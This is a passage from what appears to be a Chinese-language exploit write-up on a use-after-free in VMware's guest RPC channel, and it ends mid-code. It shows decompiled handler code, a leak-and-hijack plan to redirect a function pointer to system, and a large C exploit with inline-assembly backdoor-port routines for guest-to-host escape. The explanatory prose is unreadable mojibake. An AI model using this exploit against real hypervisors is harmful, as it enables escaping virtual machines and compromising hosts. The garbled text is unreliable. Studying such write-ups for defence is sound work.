punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_5611D0</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Non-integer argument"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Invalid protocol version."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_171460</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token function">sub_4723A0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">)</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_472380</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_1711E0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_12FA20</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Failed to set VMDB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token function">Tools_SetGuestDnDCapable</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ä¼ å…¥ä¸€ä¸ªå‚æ•°ä»£è¡¨ç‰ˆæœ¬ï¼Œå¦‚æœä¸ç¬¦åˆåˆ™é”€æ¯ä¹‹å‰çš„ç»“æ„ä½“ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç»“æ„ä½“ã€‚æ›´æ–°åœ¨<code>vmx.capability.dnd_version</code>ä¹Ÿæœ‰å¯¹åº”å®ç°ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-bb838684db02dce7205e00d839ff208fed7e2264.png" alt="å›¾ç‰‡.png"></p><p>è¿½è¸ªå‡½æ•°</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6bea8ffd78640f22c86266f875cf6f17ba55736.png" alt="å›¾ç‰‡.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-028a1df016d78ca5454c36d7bdd28d0c504175cb.png" alt="å›¾ç‰‡.png"></p><p>é‚£ä¹ˆå¯ä»¥çŒœåˆ°æ–°çš„ç»“æ„ä½“å¤§å°æ€»æ˜¯ä¸º0xa8ã€‚å¯ä»¥é€šè¿‡è¯¥æ–¹æ³•ï¼Œæ§åˆ¶bufçš„å¤§å°ä¸º0xa8ï¼Œé”€æ¯åŸæ¥çš„objectè·å¾—æ–°çš„objectçš„æ—¶å€™ï¼ŒæŠŠchannel Bçš„UAF chunkç”³è¯·å‡ºæ¥ï¼Œç„¶ååˆ©ç”¨channel C leak libcåŸºå€ã€‚</p><p>æœ‰äº†leakï¼Œåˆ©ç”¨èµ·æ¥å°±ç®€å•äº†ï¼Œç›´æ¥æ”¹fdï¼Œç„¶ååŠ«æŒåˆ°bssæ®µï¼Œæ”¹æ‰æŸä¸€ä¸ªå‡½æ•°æŒ‡é’ˆä¸ºsystemå³å¯ã€‚</p><p>æ–°çš„leakæ–¹å¼å¦‚ä¸‹</p><ul><li>å¼€å¯channel Aå’Œchannel B</li><li>Açš„è¾“å‡ºç¼“å†²åŒºä¸ºbufA,Aåˆ©ç”¨æ¼æ´free bufA</li><li>ç„¶åBç»™guestå‘é€out putï¼Œè¿™æ—¶å€™æ§åˆ¶Bçš„bufå¤§å°å’ŒAä¸€æ ·ï¼Œæ­¤æ—¶freeçš„Aå†æ¬¡è¢«mallocå‡ºæ¥</li><li>é‡Šæ”¾Aï¼ŒåŒæ—¶buf Aè¢«å†æ¬¡é‡Šæ”¾ï¼Œæ­¤æ—¶è°ƒç”¨<code>vmx.capability.dnd_version</code>ï¼Œè™šè¡¨åœ¨æ­¤æ—¶è¢«å†™å…¥bufB</li><li>leakå‡ºprocess base ç„¶åæ ¹æ®åç§»å³å¯è®¡ç®—å‡ºsystem ä»¥åŠä¸€äº›å‡½æ•°æŒ‡é’ˆçš„åœ°å€ã€‚</li></ul><p>æœ€åä»¥ç›¸åŒçš„æ–¹å¼ï¼ŒåŠ«æŒfdå³å¯,ä¸‹é¢çš„expæ˜¯é•¿äº­å¸ˆå‚…çš„ï¼Œæ ¹æ®é€šä¿¡åŸç†å®ç°äº†ä¸€å¥—é€šä¿¡æœºåˆ¶ï¼Œå…·ä½“å†…å®¹çœ‹å‚è€ƒï¼Œä¸èµ˜è¿°ã€‚</p><p>expï¼š</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rdi,%%r10\n\t"</span>        <span class="token string">"movq %%rsi,%%r11\n\t"</span>        <span class="token string">"movq %%rdx,%%r12\n\t"</span>        <span class="token string">"movq %%rcx,%%r13\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0xc9435052,%%ebx\n\t"</span>        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>        <span class="token string">"movl $0x5658,%%edx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $0,%%r12\n\t"</span>        <span class="token string">"1:\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"add %%r12,%%rbp\n\t"</span>        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"addq $4,%%r12\n\t"</span>        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>        <span class="token string">"ja 1b\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"in %%dx,%%eax\n\t"</span>        <span class="token string">"add %%r11,%%rbp\n\t"</span>        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x21,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>      <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a 